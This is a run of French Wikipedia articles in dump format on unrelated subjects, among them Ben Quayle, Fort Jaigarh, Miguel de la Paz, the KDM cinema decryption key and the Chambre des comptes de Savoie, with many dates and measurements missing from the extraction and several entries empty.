Liste de films français sortis en 1972

Liste non exhaustive de films français sortis en 1972

</doc>
<doc id="10575655" url="https://fr.wikipedia.org/wiki?curid=10575655" title="Ben Quayle">
Ben Quayle

Benjamin Eugene Quayle dit Ben Quayle, né le à Fort Wayne (Indiana), est un homme politique américain. Membre du Parti républicain, il est élu pour l'Arizona à la Chambre des représentants des États-Unis de 2011 à 2013.
Biographie.
Ben Quayle est le fils du vice-président des États-Unis, Dan Quayle et de sa femme Marilyn. Il obtient un ' de l'université Duke en 1998 puis un ' de Vanderbilt en 2002. Il devient alors avocat. Il dirige par la suite une société d'investissement à Scottsdale.
En 2010, il est candidat à la Chambre des représentants des États-Unis dans le de l'Arizona, une circonscription conservatrice de la banlieue nord de Phoenix où le sortant, John Shadegg, ne se représente pas. Malgré ses anciennes contributions sur un site osé ("DirtyScottsdale.com"), il remporte la primaire républicaine devant neuf concurrents. Avec 23 % des suffrages, il devance de cinq points son plus proche adversaire. Durant la campagne pour l'élection générale, son adversaire démocrate Jon Hulburd fait diffuser des publicités sur des radios chrétiennes mettant en avant ces contributions, faites sous le pseudonyme d'un acteur pornographique. Quayle est élu représentant avec 52,2 % des voix, devant Hulburd (41,1 %) et deux autres candidats.
Deux ans plus tard, les circonscriptions de l'Arizona sont redécoupées. Les deux-tiers de son ancien district se retrouvent dans le , où il choisit de se présenter. Durant la primaire, il doit affronter un autre représentant sortant, David Schweikert. Celui-ci attaque Quayle, estimant qu'il n'a été élu représentant que grâce au nom et au réseau de son père. Quayle est battu par Schweikert, 47 % des suffrages contre 53 %.
Un temps pressenti pour se présenter face à Kyrsten Sinema en 2014, Quayle rejoint la société de lobbying Clark Hill.
Positions politiques.
Ben Quayle est un républicain conservateur, opposé à l'avortement et au mariage homosexuel.

</doc>
<doc id="10575665" url="https://fr.wikipedia.org/wiki?curid=10575665" title="Nicole Stephane">
Nicole Stephane



</doc>
<doc id="10575668" url="https://fr.wikipedia.org/wiki?curid=10575668" title="Minyen">
Minyen



</doc>
<doc id="10575687" url="https://fr.wikipedia.org/wiki?curid=10575687" title="La Nuit claire">
La Nuit claire

La Nuit claire est un film français réalisé par Marcel Hanoun et sorti en 1979.

</doc>
<doc id="10575692" url="https://fr.wikipedia.org/wiki?curid=10575692" title="Janvier 2017 en sport">
Janvier 2017 en sport



</doc>
<doc id="10575707" url="https://fr.wikipedia.org/wiki?curid=10575707" title="Les Fantômes d'Ismaël">
Les Fantômes d'Ismaël

Les Fantômes dIsmaël est un film français réalisé par Arnaud Desplechin, sorti en 2017. Il a été présenté en ouverture, hors compétition, au festival de Cannes 2017.
Synopsis.
Ismaël Vuillard, sur le point de tourner un film sur le portrait d'Ivan, un diplomate atypique inspiré de son frère, est perturbé par le retour de Carlotta, sa femme disparue vingt ans plus tôt et dont il n'a pas réussi à faire le deuil. Sa nouvelle compagne, Sylvia, s'enfuit et Ismaël rejette Carlotta. Alors que sa raison semble vaciller, il quitte le tournage pour retrouver sa maison familiale à Roubaix, assailli par ses fantômes.
Inspirations et thématiques.
Les thématiques du film sont multiples : triangle amoureux, métafiction, trompe-l'œil, projection autobiographique et fantômatique, humour, judaïsme, narration décousue… D'où les comparaisons avec Ingmar Bergman, Alfred Hitchcock (le prénom de Carlotta renvoie à "Vertigo"), François Truffaut, James Joyce, Claude Lanzmann (le personnage d'Henri Bloom est un double du cinéaste) et Woody Allen.
Ismaël donne des réflexions artistiques à travers Jackson Pollock, Pablo Picasso, "Les Époux Arnolfini" et "L'Annonciation".
Le tableau "Carlotta", portrait de Marion Cotillard jeune, a été réalisé par Sylvie Vanlerberghe, peintre. 
Carlotta danse sur "" de Bob Dylan.
Accueil.
Accueil critique.
L'accueil critique est partagé : le site Allociné recense une moyenne des critiques presse de 4/5, et des critiques spectateurs à 2,2/5, soit une moyenne de 12,4/20, si l'on prend en compte les deux notes. 
Selon Serge Kaganski, des "Inrockuptibles", le film est réalisé par .
Selon Thomas Baurez, du magazine "Studio Ciné Live" : 
Louis Guichard, de "Télérama", dit que .
Selon Éric Neuhoff, du "Figaro" : 
Selon Luc Chessel, du journal "Libération", le film est .
Nicolas Shaller, du "Nouvel Observateur", pense qu'.

</doc>
<doc id="10575711" url="https://fr.wikipedia.org/wiki?curid=10575711" title="Fort Jaigarh">
Fort Jaigarh

Fort Jaigarh (Hindi : जयगढ़ क़िला) est situé sur un promontoire rocheux appelé « Cheel ka Teela » (colline des Aigles) dans le massif des Aravalli. Il surplombe le fort d'Amber et le lac Maota, près de Jaipur, dans l'État du Rajasthan en Inde. Le fort a été construit sous le règne de Jai Singh II en 1726 pour protéger le fort d'Amber et ses palais.
Le fort, robuste et semblable dans sa structure au fort d'Amber, est également connu sous le nom de « "fort de la Victoire" ». 
Il mesure de long sur de large. C'est l'un des plus grands et des mieux conservé du Rajasthan. 
Fort Jaigarh contient un complexe de palais (Laxmi Vilas, Lalit Mandir, Vilas Mandir et Aram Mandir), un arsenal et un musée, ainsi que des temples. Le fort est aussi pourvu de casernements, de magasins de vivres, d'une armurerie, d'une poudrière et des réserves d'eau nécessaires à la tenue d'un siège. Le fort Jaigarh forme un seul ensemble avec le fort d'Amber auquel il est relié par un réseau de galeries souterraines ou couvertes.
Un canon nommé Jaivana se trouve dans l'enceinte du fort. Il a été fabriqué dans la fonderie de canon de l'arsenal proche et était alors le plus grand canon sur roues du monde.
Géographie.
Le fort Jaigarh, situé à d'altitude sur l'un des sommets de la chaîne des collines d'Aravalli, est construit à environ au-dessus du fort d'Amber. Il offre une excellente vue sur les collines alentour, leur réseau de fortifications et sur Amber.
L'ensemble fortifié est à de Jaipur. Il se trouve sur une courte dérivation de l'autoroute Jaipur-Delhi, qui conduit au canon Jaivana à la « porte de Dungar » (Dungar Darwaza). La même route conduit à un autre fort important appelé le fort Nahargarh qui surplombe Jaipur. Fort Jaigarh peut également être atteint à partir du fort d'Amber par une courte montée le long d'une colline escarpée, qui mène à la « porte Awami » près du musée du fort.
Histoire.
La ville d'Amber était connue dans la période antique et médiévale comme s'appelant Dhundhar (sens attribué à une monture sacrificielle dans les frontières occidentales). 
Ce qui est connu de nos jours comme le fort Jaigarh était en fait alors la principale structure défensive plutôt que le palais lui-même. Les deux structures sont interconnectées par une série d'enceintes fortifiées et de tunnels. 
Gouverné par le clan Kachwaha à partir du l'histoire d'Amber et de Jaigarh est indéfectiblement liée à ces souverains, car ils ont fondé leur empire à Amber.
Description.
Le fort est solidement protégé par des remparts épais de grès rouge, sur ses de long et de large. Les remparts dans chaque angle sont inclinés et donnent accès aux structures de niveau supérieur. 
La forme générale de l'ouvrage est un rectangle très allongé, composé de trois parties sensiblement orientées Nord-Sud, le rectangle central étant décalé vers l'Ouest.
L'Aram Mandir et le jardin dans sa cour, sur le côté nord du complexe du fort, a une triple entrée cintrée l'Awani Darwaza qui a été rénovée.
La porte à trois arches Awani Darwaza possède des motifs peints en rouge et en jaune. Elle fait face à l'ouest. Les éléments architecturaux sont de style indo-persan avec des murs cyclopéens construits avec de la pierre crépie et jointée avec du mortier de chaux. 
Il y a deux temples dans les quartiers du fort, l'un est le temple Ram Harihar du , l'autre est le Kal Bhairav du .
Les réservoirs.
Hors du fort, le lac Sagar (un lac artificiel) situé au Nord est la principale ressource en eau pour les deux forts. L'eau du lac était transportée jusqu'au fort Jaigarh dans des outres en peau à dos d'éléphant ou dans des jarres à dos d'homme, en empruntant une rampe fortifiée prévue à cet effet.
Outre le lac Sagar, les capacités nécessaires à l'approvisionnement en eau du fort ont été atteintes en créant des infrastructures de captation d'eau à partir du bassin hydrographique des Aravalli et en acheminant cette eau par un canal situé sur le côté ouest du fort, sur une distance de jusque sous la cour centrale. Le plus grand réservoir est couvert pour éviter l'évaporation et son toit est soutenu par 18 piliers. Il avait une capacité de d'eau, la plus petite citerne contenait environ . 
Selon des rumeurs, un trésor appartenant aux souverains Kachwaha d'Amber aurait été caché dans les quartiers du fort ou dans ses réservoirs.
La fouille du site a d'abord été ordonnée par le Premier ministre indien Indira Gandhi en 1975-1977. Une recherche a également été lancée, en 1977 dans tous les bâtiments du fort, par le département de l'impôt sur le revenu, en utilisant des détecteurs de métaux.
Une question fut même posée au Parlement de l'Inde en ces termes : "".
Cependant, la recherche effectuée par une unité de l'armée au fort de Jaigarh, n'a rien trouvé après trois mois de fouilles. On a alors conjecturé que Sawai Jai Singh avait probablement utilisé ce trésor pour construire la ville de Jaipur.
Toutes les recherches menées jusqu'à maintenant ont donc été totalement infructueuses. 
De plus, une grande partie de la zone sud est exempte de construction, le terrain étant utilisé pour collecter l'eau de pluie des moussons.
Les palais et les temples.
Le temple de Ram Harihar est à un angle de Jaleb Chowk. Il est dédié à Vishnou le « Créateur » et à Shiva le « Destructeur ». Le temple de Kal Bhairav est adjacent, Bhairav étant la forme de « Shiva armé », vénérée comme gardien.
Lakshmi Vilas a été construit sous Mirza Raja Jai Singh. C'est l'un des plus beaux palais de l'ensemble. Le plancher est travaillé avec de l"'araish", une technique typique du Rajasthan qui produit une surface extrêmement lisse, brillante et sans craquelure. Les arcades et les murs sont simplement mais délicatement ornés.
Lalit Mandir est un palais d'été à deux étages. L'étage supérieur dispose de chambres avec balcons attenants. Les chambres ont des "jharokhâ" en pierre et des "jali" pour permettre à la brise fraîche d'entrer. Ce palais offre une vue étendue sur le lac Sagar et les fortifications.
Vilas Mandir, palais construit au , était réservé aux dames de la famille royale.
Aram Mandir est un pavillon construit au pour la détente des souverains devant le jardin royal.
La zone des palais, contient également un théâtre pour les spectacles de marionnettes, de musique et de danse, ainsi qu'un espace ouvert réservé à la restauration, les convives masculins et féminins ayant chacun leur salle à manger.
L'armurerie.
L'armurerie expose un large échantillon d'épées, de boucliers, de pistolets, de mousquets et aussi un boulet de canon de . 
Les photos exposées sont de vieilles photographies des Maharajas de Jaipur, à savoir Sawai Bhawani Singh et le Major général Man Singh II qui ont servi dans l'armée indienne comme officiers supérieurs.
Le musée.
Le musée est situé à gauche de la porte d'Awami. Y sont exposés des photographies de la famille royale de Jaipur, des timbres et de nombreux documents, qui comprennent un ensemble circulaire de cartes, un crachoir du et un dessin des palais.
La fonderie de canons.
Pendant le règne de l'empereur Moghol Shâh Jahân, le fort Jaigarh est devenu l'une des fonderies de canons les plus renommées au monde, principalement en raison de l'abondance de mines de fer dans les environs. 
La fonderie de canons possédait un grand tunnel de vent qui aspirant l'air des montagnes vers son four permettait d'atteindre des températures aussi élevées que . L'air surchauffé servait à fondre le métal. Le métal liquide remplissait d'abord une poche intermédiaire, puis le moule du canon situé dans la fosse de coulée. La plupart de ces canons étaient massifs (presque de long) et devaient être fondus en une seule coulée. 
Les Rajput avaient également construit un mécanisme ingénieux et d'une grande précision à axe vertical, entraîné par quatre paires de bœufs. Une démultiplication permettait d'atteindre une grande vitesse de rotation afin d'utiliser cet appareil pour aléser le tube des canons. 
Quand la guerre de succession moghole a éclaté en 1658, Dârâ Shikôh - successeur désigné de son père Shâh Jahan - assurait le commandement de l'avant-poste du fort Jaigarh, jusqu'à ce qu'il ait été défait et, comme ses deux autres frères et leur père, exécuté par son frère cadet Aurangzeb. 
Plus tard cependant, l'empereur moghol Muhammad Akbar Shâh nomme par firman Jai Singh II comme "Qiladar" moghol officiel du fort Jaigarh. Éminent savant de son époque, Jai Singh II est réputé avoir ainsi fait mouler le grand canon Jaivana en utilisant la fonderie et les dispositifs du fort.
Le canon Jaivana.
Le fort Jaigarh était un centre de production d'artillerie Rajput. Il abrite aujourd'hui le Jaivana. Au moment de sa fabrication en 1720, c'était le plus grand canon du monde sur roues. Le Jaivana a été fabriqué pendant le règne du Maharaja Sawai Jai Singh II (1699-1743).
La fonderie où il a été fabriqué est également située au fort. Une plaque à l'entrée de l'enceinte où le canon est exposé, donne des informations pertinentes sur l'histoire du canon, sa taille et son utilisation. Le canon n'a jamais été utilisé dans aucune bataille car les dirigeants Rajput d'Amber avaient à cette époque des relations amicales avec les souverains moghols. D'ailleurs le bon état de conservation du fort en témoigne. 
Le canon n'a tiré qu'une seule fois avec une charge de de poudre et le boulet a été propulsé à une distance d'environ .
Le canon mesure de longueur et pèse . Il tire des boulets de de diamètre. Le tube est décoré de sculptures qui représentent des arbres, une suite d'éléphants et une paire de canards. Il est monté sur roues et l'essieu arrière est monté sur un pivot à galets, pour pouvoir le tourner sur et faire feu dans n'importe quelle direction. 
Un abri d'étain a été construit pour protéger le canon contre les intempéries. Le canon avait une portée de plus de et envoyait des boulets de .
Un second canon construit en 1691 est présenté sur le site. Nommé Bajrangvana il est orné de deux dauphins sur son tube. Il était amené sur le champ de bataille par 32 bœufs. Son tube est manchonné en fer afin d'être plus résistant au frottement des boulets.

</doc>
<doc id="10575714" url="https://fr.wikipedia.org/wiki?curid=10575714" title="Miguel de la Paz">
Miguel de la Paz

Miguel de la Paz de Avís y Trastámara (en portugais Miguel da Paz de Trastâmara e Avis) (, Saragosse – , Grenade) était un prince portugais, fils de Manuel et de sa première épouse, Isabelle d’Aragon, princesse des Asturies, héritier des couronnes de Portugal, Castille, León et Aragon.
Biographie.
Petit-fils des rois catholiques et du roi de Portugal, l'infant Miguel de la Paz est né à Saragosse, en Espagne, le . Sa mère meurt en couches, moins d’une heure après l’avoir mis au monde. Dès sa naissance, il hérite des titres dynastiques de trois couronnes de la péninsule Ibérique (Portugal, Castille et Aragon). Dans les deux années qui suivent sa naissance, il est reconnu héritier du trône de son père, le roi de Portugal, ainsi que des possessions de ses grands-parents maternels, Ferdinand II d’Aragon et Isabelle la Catholique. En plus du Portugal, il est appelé à régner sur la Castille, le León et l' Aragon. Il est dès lors titré , prince des Asturies et prince de Gérone.
Le , Miguel meurt à Grenade, dans les bras de sa grand-mère. Il est inhumé en la chapelle royale de Grenade.
En octobre, son père se remarie à Marie d’Aragon, sœur cadette d’Isabelle. Marie donnera naissance à dix enfants, parmi lesquels le prince héritier et futur Jean III.
Les espoirs de Ferdinand II et d’Isabelle de voir s’unifier tous les royaumes de la péninsule s’éteignent avec la mort de Miguel. Son autre tante maternelle, Jeanne, mariée à l'archiduc Philippe d'Autriche, comte de Bourogne, prince des Pays-Bas bourguignons et fils aîné de l'empereur Maximilien Ier du Saint-Empire, reçoit la Castille, le León et l’Aragon en héritage, qui passeront vite à son fils, le futur Charles Quint.
Il faudra attendre quatre-vingts ans pour voir le vœu de Ferdinand II et d’Isabelle se réaliser lorsque Philippe II, roi d’Espagne, réunira les royaumes de 1580 à 1640.

</doc>
<doc id="10575719" url="https://fr.wikipedia.org/wiki?curid=10575719" title="Even Israël">
Even Israël



</doc>
<doc id="10575727" url="https://fr.wikipedia.org/wiki?curid=10575727" title="Album Oriented Rock">
Album Oriented Rock



</doc>
<doc id="10575733" url="https://fr.wikipedia.org/wiki?curid=10575733" title="Michel de la Paix">
Michel de la Paix



</doc>
<doc id="10575734" url="https://fr.wikipedia.org/wiki?curid=10575734" title="WITS Academy">
WITS Academy

 est une telenovela américaine en de créée par Mariela Romero et Catharina Ledeboer et diffusée entre le 5 et le sur Nickelodeon. C'est un spin-off de la série télévisée américaine .
La série est diffusée en avant-première le est officiellement diffusée du au en Belgique.
Synopsis.
Cette nouvelle série est un spin off de , elle est centrée sur Andi Cruz, qui est maintenant une gardienne en formation à la WITS Academy, l'école la plus estimée du Magical Realm pour les sorcières et les sorciers en formation. Mais en tant que meilleure amie et gardienne non officielle pour être choisie, elle devra travailler dur pour prouver qu'elle peut répondre aux attentes en tant que première (et unique) gardienne humaine. De plus, elle est chargée d'obtenir les diplômes des sorcières et sorciers les plus difficiles du Magical Realm pour le jour de l'obtention du diplôme, dont une est la petite sœur de Jax Jessie ! Au fil du temps, elle devra décider qui est un ami, qui est un ennemi et qui peut être plus.
Épisodes.
Saison 1 (2015).
En France, la date est inconnue, en Belgique la série a été diffusée en avant-première le et officiellement diffusée du au sur Nickelodeon Belgique.

</doc>
<doc id="10575743" url="https://fr.wikipedia.org/wiki?curid=10575743" title="Cross-collatéralisation">
Cross-collatéralisation

En finance, la cross-collatéralisation des droits désigne le fait de récupérer les bénéfices d'un support d'exploitation pour compenser les pertes du même produit exploité sur un autre support. Cette pratique est courante dans le cinéma et l'audiovisuel, lorsqu'une société est titulaire de plusieurs droits d'exploitation (exploitation en salle, exploitation en vidéo, etc.)

</doc>
<doc id="10575751" url="https://fr.wikipedia.org/wiki?curid=10575751" title="Maxwell Konadu">
Maxwell Konadu

Maxwell Konadu est un footballeur ghanéen né le à Kumasi. Il évoluait au poste d'attaquant devenu entraîneur.
Biographie.
En club.
Maxwell Konadu joue au Ghana, en Tunisie et au Portugal. Il dispute 12 matchs en première division portugaise (deux buts), 47 matchs en deuxième division portugaise (huit buts), et 10 matchs en troisième division portugaise (deux buts).
Il dispute deux matchs en Coupe de l'UEFA avec le club de Beira-Mar lors de la saison 1999-2000.
En équipe nationale.
Il est médaillé de bronze avec le Ghana lors des Jeux olympiques d'été de 1992. Il dispute trois matchs lors du tournoi olympique.
International ghanéen, il reçoit 2 sélections en équipe du Ghana en 1997.
Palmarès.
Joueur.
"Avec Asante Kotoko :"
"Avec le Ghana :"
Entraîneur.
"Avec Asante Kotoko :"

</doc>
<doc id="10575755" url="https://fr.wikipedia.org/wiki?curid=10575755" title="Adam Stockhausen">
Adam Stockhausen

Adam Stockhausen est un chef décorateur et un directeur artistique américain né le à Brookfield (Wisconsin).
Biographie.
Adam Stockhausen sort diplômé du département théâtre de l'Université Marquette (Milwaukee, Wisconsin) en 1995, et de la Yale School of Drama (New Haven, Connecticut) en 1999.
Il grimpe ensuite les échelons, d'électricien à créateur de décors, du Midwest jusqu'à New York. Il commence à travailler pour le cinéma en 2004, lorsque Mark Friedberg l'engage pour travailler sur le film de Charlie Kaufman "Synecdoche, New York".

</doc>
<doc id="10575760" url="https://fr.wikipedia.org/wiki?curid=10575760" title="Delena cancerides">
Delena cancerides

Delena cancerides est une espèce d'araignées aranéomorphes de la famille des Sparassidae.
Distribution.
Cette espèce se rencontre originellement en Australie mais a été introduite en Nouvelle-Zélande, où elle est parfois connue sous le nom d'araignée d'Avondale.
Description.
Les femelles mesurent jusqu'à .
Éthologie.
Les araignées de cette espèce vivent en colonies qui peuvent atteindre 300 individus.

</doc>
<doc id="10575762" url="https://fr.wikipedia.org/wiki?curid=10575762" title="Delena impressa">
Delena impressa



</doc>
<doc id="10575779" url="https://fr.wikipedia.org/wiki?curid=10575779" title="Rue des Prêtres-Saint-Paul">
Rue des Prêtres-Saint-Paul



</doc>
<doc id="10575781" url="https://fr.wikipedia.org/wiki?curid=10575781" title="Henri Charles Arnauld de Pomponne">
Henri Charles Arnauld de Pomponne



</doc>
<doc id="10575785" url="https://fr.wikipedia.org/wiki?curid=10575785" title="The Woman Who Left">
The Woman Who Left



</doc>
<doc id="10575789" url="https://fr.wikipedia.org/wiki?curid=10575789" title="Key Delivery Message">
Key Delivery Message

Le (généralement désigné sous le sigle KDM, et souvent utilisé au féminin, La KDM, la clef de décryptage ou clef de lecture) est un fichier numérique envoyé par un distributeur à un exploitant pour lui permettre d'ouvrir un DCP afin de projeter un film. Le DCP étant un fichier chiffré pour prévenir le téléchargement illégal, le KDM permet de sécuriser le film. Un KDM permet en effet de déverrouiller le DCP pour une salle donnée et une durée d'exploitation donnée. Elle circule entre le distributeur et les exploitants par voie postale (sur une clé USB) ou via mail.

</doc>
<doc id="10575790" url="https://fr.wikipedia.org/wiki?curid=10575790" title="Déborah Lukumuena">
Déborah Lukumuena

Déborah Lukumuena est une actrice française, née le à Villeneuve-Saint-Georges (Val-de-Marne).
En 2017, elle reçoit le César de la meilleure actrice dans un second rôle pour son premier film, "Divines".
Biographie.
Déborah Lukumuena naît le à Villeneuve-Saint-Georges (Val-de-Marne) Quatrième enfant d'une fratrie de cinq, elle grandit à Épinay-sous-Sénart dans une famille d'origine congolaise. Après son baccalauréat, elle obtient une licence en lettres. Durant ses études, elle découvre la série "Les Tudor" et l'interprétation de Jonathan Rhys-Meyers lui donne envie de jouer au cinéma.
Elle répond à une petite annonce de casting, dans l'idée d'obtenir un emploi de figurante, mais elle est retenue pour interpréter l'un des rôles principaux du film "Divines" de Houda Benyamina. Ce film la révèle.
Pour ce rôle, elle reçoit, "ex æquo" avec sa partenaire Oulaya Amamra, le prix de la meilleure actrice aux Journées cinématographiques de Carthage en 2016, puis le prix Lumières du meilleur espoir féminin lors de la cérémonie de 2017. La même année, elle obtient le César de la meilleure actrice dans un second rôle, devenant la plus jeune et la première actrice noire à recevoir ce prix. Elle intègre ensuite le Conservatoire national supérieur d'art dramatique.
Déborah Lukumuena apparaît dans un clip vidéo de Charlotte Abramow, utilisant la chanson "Les Passantes" de Georges Brassens, diffusé le à l'occasion de la Journée internationale des femmes. Cette même année, elle est également à l'affiche du film "Les Invisibles", avec Audrey Lamy et Corinne Masiero ; cette comédie de Louis-Julien Petit est consacrée aux femmes qui vivent entre la rue et les centres d’hébergement.
Début 2019, elle joue au théâtre Gérard-Philipe à Saint-Denis, interprétant Anguille, personnage du roman de l'écrivain comorien Ali Zamir, "Anguille sous roche", dans une adaptation mise en scène par Guillaume Barbot. Parlant du mode d'expression d'Ali Zamir, elle explique que . Elle précise aussi : 

</doc>
<doc id="10575797" url="https://fr.wikipedia.org/wiki?curid=10575797" title="Chambre des comptes de Savoie">
Chambre des comptes de Savoie

La Chambre des comptes de Savoie était, au cours de la période médiévale, une cour princière spécialisée dans les affaires de finance du comté, puis du duché de Savoie.
Le comté de Savoie a été élevé en duché par l'empereur l'empereur Sigismond, le .
Historique.
Entre le et le , la maison de Savoie va agrandir ses possessions qui vont s'étendre du Viennois et du Bugey à l'ouest, au Valais et au val d'Aoste à l'est, à une partie du pays de Vaud au nord, et à Turin-Pignerol au sud. La totalité du Piémont et le comté de Nice s'ajoutent au , le comté de Genève en 1401, Verceil en 1428. Entre 1200 et 1260, elle va mettre en place une administration et des organes de contrôle du domaine et des comptes efficaces. Le comte Thomas a placé un châtelain salarié dans chaque métral du domaine comtal.
Fidèles soutiens des empereurs du Saint-Empire romain germanique, les comtes de Savoie ont cherché à élargir leurs soutiens à partir des difficultés de l'empereur Frédéric II.
Début du contrôle des comptes sous Pierre II de Savoie.
Des relations ont existé entre les comtes de Savoie :
Étant apanagé du Bugey, après la mort de son père, Pierre de Savoie exige de ses châtelains des comptes transcrits sur rouleaux à partir de 1240. Les plus anciens comptes connus sont ceux de Chillon, Conthey et Saillon en Chablais, en 1257-1258. Avant 1255, il avait réuni près de lui un groupe de clercs des comptes. Pierre de Savoie a construit au château de Chillon le bâtiment du trésor, entre 1255 et 1259, qui comporte une salle pour le contrôle des documents.
Pierre de Savoie, devenu comte en 1263, généralise le contrôle des comptes de châtellenies dans le comté. On distingue pendant cette période :
Le receveur des comptes à l'origine des rouleaux est donc distingué de l'auditeur qui effectue la vérification de ces comptes. Le contrôle des comptes s'effectue de manière ambulatoire. Son frère, Philippe, qui lui succède, ne poursuit pas l'expérience.
Le comte de Savoie a développé l'usage des « extentes », qui sont des inventaires, comprenant la description du Domaine avec les biens et les droits du comte, appelés "extenta" dans les documents du Moyen Âge. La plus ancienne extente conservée date de 1272, mais les comptes de la châtellenie de Montmélian citent un extente en 1263. Les extentes les plus tardives datent des années 1334-1335. Les commissaires chargés des extentes devaient faire avouer les droits du comte dans chaque village d'une métralie comtale et relever toutes les recettes du comte, les tenir à jour et repérer les cas de commise et d'échute. La rédaction des extentes servant au comte à établir ses droits et ses revenus supposait un personnel honnête et compétent qui devait prêter serment.
Installation du contrôle des comptes à Chambéry.
Le comte Thomas a acheté au vicomte Berlion de Chambéry, seigneur de Chambéry, une partie du bourg en 1232.
En 1295, Amédée V a acquis le château de Chambéry par échange de François de La Rochette, seigneur de Chambéry, et de son épouse Béatrix. Il y entreprend des travaux importants. Il fixe de manière définitive les institutions comtales à Chambéry.
Un bâtiment entier est construit dans le château, entre la première et la deuxième porte, pour l'usage exclusif de la Chambre des comptes. Les salles hautes servent au contrôle des comptes, le rez-de-chaussée au contrôle de l'accès, les salles basses au dépôt des archives. Le château du Bourget garde le numéraire. Le comte Amédée V a, dès le début de son règne, ordonné le premier aux châtelains de venir rendre leurs comptes à l’hôtel comtal. Le comte est souvent présent au moment des opérations de contrôle des comptes et il peut condamner une gestion douteuse comme on peut le lire sur les comptes de la châtellenie de Montmélian, en 1317-1319, « "vidit dominus et non placet" ». Pour être sûr du bon fonctionnement de son hôtel ou de celui de la comtesse ainsi que pour l'office de trésorier-général, le comte choisit avec soin les officiers, en évitant d'employer ceux qui ont travaillé dans les mouvements de fonds, qu'ils soient Lombards, Juifs ou autres usuriers.
Première appellation « Chambre des comptes ».
La première utilisation de l'appellation « Chambre des comptes » date des ordonnances de 1329.
Par les ordonnances du , le comte Aymon de Savoie, dit « le Pacifique », établit un Conseil résident à Chambéry (ancêtre du Sénat de Savoie). À la justice ambulatoire, . Le siège de ce conseil est fixé au château de Chambéry. Le comte nomme les personnes devant faire partie du Conseil résident près de sa personne, il s'agit d'un . Les maîtres des comptes font partie des conseillers. Les registres des bailliages, châtellenies, jugeries, et du Conseil résident sont portés à la Chambre des comptes, de même que tous les protocoles, notes de tous les secrétaires et notaires du comte, puis du duc, afin de conserver par ce moyen les droits du domaine et de la couronne. Ces ordonnances donnent le premier règlement de la Chambre des comptes.
Avec le soutien du comte, les gens des comptes vont exiger des baillis qu'ils ne remettent aucune possession du prince sans leur autorisation préalable. La Chambre des comptes va arriver à imposer l'obligation des châtelains de détailler les recettes tous les dix ans, ce qui est définitivement acquis en 1340.
Ordonnance du 7 février 1351.
Amédée VI de Savoie précise dans une ordonnance les attributions de la Chambre des comptes.
Statuts de 1389.
De nouveaux statuts sont donnés à la Chambre des comptes de Savoie par Bonne de Bourbon, et le comte Amédée VII de Savoie. Ces statuts précisent les droits et devoirs des maîtres des comptes et des commissaires. Il imposent des vérifications annuelles sur place. Ils indiquent les obligations de tous les officiers, en particulier de se rendre personnellement chaque année à Chambéry pour la vérification des comptes.
Si le comte s'est réservé le domaine de la monnaie, la Chambre des comptes a pu contrôler la gestion des maîtres des monnaies et de leurs officiers qui sont placés sous l'autorité d'un maître général des monnaies depuis 1340.
Statuts de Savoie de 1430.
En 1430, le duc de Savoie Amédée VIII a établi les « Statuts de Savoie ». Ces statuts forment un règlement de tous les offices, dignités, et de la police de l'État. Il a donné au Conseil résident siégeant à Chambéry la même autorité qu'au Conseil résident siégeant près du duc.
Après la restitution du duché en 1559.
Le duché de Savoie est occupé par François en 1535. La Chambre des comptes a dû quitter Chambéry en 1536 et devenir ambulatoire en suivant le duc Charles III. François a créé une Chambre des comptes commune à la Savoie et au Piémont le 15 juin 1539, supprimée en décembre 1550 mais recréée deux ans plus tard. Après la restitution du duché à Emmanuel-Philibert de Savoie, le Conseil résident a pris le nom de Sénat de Savoie. La Chambre des comptes a été érigée en Cour souveraine par l'édit du 6 octobre 1560.
Un Conseil résident a été fondé à Turin par le duc Louis en 1448 et la Chambre des comptes de Turin a été créée par le duc Emmanuel-Philibert en 1577. La Chambre des comptes de Savoie va s'effacer devant celle de Turin. Le duc de Savoie Victor-Amédée II, devenu roi de Sardaigne, supprime la Chambre des comptes de Savoie par l'édit du 27 janvier 1720.
Le Sénat et la Chambre des comptes de Savoie ont dû cesser de fonctionner à chaque période d'occupation de Chambéry par les armées françaises :
La Chambre des comptes s'est plusieurs fois élevée contre l'augmentation des impôts dès 1612.
Cas particulier de la Chambre des comptes de Genevois.
À l'intérieur du duché de Savoie, l'ensemble formé par le Genevois, le Faucigny et le Beaufortain constituent une entité particulière durant les . Un apanage a été créé sur ces terres en 1514 et confié à des princes cadets de la maison de Savoie. Sept comtes élevés à la dignité ducale en 1564 se succèdent de mâle en mâle jusqu’en 1659. Les comtes de Genève sont de grands féodaux, séjournant plus souvent à la cour de France qu'en Savoie, et délégant leur autorité à un gouvernement siégeant à Annecy au sommet duquel on trouve le Conseil de Genevois et la Chambre des comptes de Genevois. Cette dernière constitue d'abord une simple section de la Chambre des comptes de Savoie, elle devient une juridiction autonome en 1525 siégeant à Annecy en 1526, et au palais de l'Isle à partir de 1550 environ.
Composition de la Chambre des comptes.
En 1432, la Chambre comptait un président, trois maîtres et auditeurs des comptes et dix receveurs des comptes, dont les deux archivistes.
En 1522, la Chambre des comptes comprend un président, quatre maîtres des comptes et huit receveurs. En 1682, bien que sa juridiction ait été réduite à la suite de la création de la Chambre des comptes de Turin, il y a cinq présidents, deux chevaliers, seize auditeurs, un contrôleur général, un avocat patrimonial, un clavaire (archiviste), un référendaire, des greffiers, contrôleurs, vice-clavaires, receveurs, commissaires d'extentes et huissiers.
Présidents.
Jean-Louis Grillet, dans son "Dictionnaire historique" (1807), donne une liste, complétée notamment par Eugène Burnier, dans son "Histoire du Sénat de Savoie" (1864-1865), pour la seconde partie à partir de 1537.
Entre, 1536 - 1559, occupation française de la Savoie. La Chambre se retire à Verceil. Maintien d'une institution. En 1551, François de Vachon en est le président.
Annexes.
Fonds des archives.
Les archives de la Chambre des comptes ont été transférées à Turin en 1724 après sa suppression.

</doc>
<doc id="10575800" url="https://fr.wikipedia.org/wiki?curid=10575800" title="Rue des Poulies-Saint-Pou">
Rue des Poulies-Saint-Pou



</doc>
<doc id="10575804" url="https://fr.wikipedia.org/wiki?curid=10575804" title="Luwagga Kizito">
Luwagga Kizito

Luwagga William Kizito, né le à Kisubi, est un footballeur international ougandais. Pouvant évoluer au poste d'ailier ou de milieu offensif, il joue actuellement pour le Hapoël Kfar Saba.
Biographie.
En club.
Lors de la saison 2014-2015, il inscrit 13 buts en deuxième division portugaise avec l'équipe du Sporting Covilhã.
En équipe nationale.
Luwagga Kizito reçoit sa première sélection avec l'équipe d'Ouganda lors d'un match amical face à l'Égypte, le (défaite 1-2).
